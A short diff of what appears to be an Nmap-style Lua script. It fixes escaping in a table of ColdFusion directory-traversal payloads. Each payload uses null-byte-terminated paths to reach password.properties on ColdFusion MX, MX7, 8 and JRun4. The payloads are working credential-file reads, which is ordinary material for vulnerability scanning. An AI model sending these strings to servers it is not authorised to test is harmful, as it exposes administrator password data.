@@ -114,10 +114,10 @@ locale parameter]],
  	end
 
 	local exploits = {
-		['CFusionMX'] = '..\\..\\..\\..\\..\\..\\..\\..\\CFusionMX\\lib\\password.properties\%00en',
- 		['CFusionMX7'] = '..\\..\\..\\..\\..\\..\\..\\..\\CFusionMX7\\lib\\password.properties\%00en',
-		['ColdFusion8'] = '..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion8\\lib\\password.properties\%00en',
- 		['JRun4\\servers'] = '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\JRun4\\servers\\cfusion\\cfusion-ear\\cfusion-war\\WEB-INF\\cfusion\\lib\\password.properties\%00en',
+		['CFusionMX'] = '..\\..\\..\\..\\..\\..\\..\\..\\CFusionMX\\lib\\password.properties%00en',
+ 		['CFusionMX7'] = '..\\..\\..\\..\\..\\..\\..\\..\\CFusionMX7\\lib\\password.properties%00en',
+		['ColdFusion8'] = '..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion8\\lib\\password.properties%00en',
+ 		['JRun4\\servers'] = '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\JRun4\\servers\\cfusion\\cfusion-ear\\cfusion-war\\WEB-INF\\cfusion\\lib\\password.properties%00en',
  	}
 
 	local results = {}
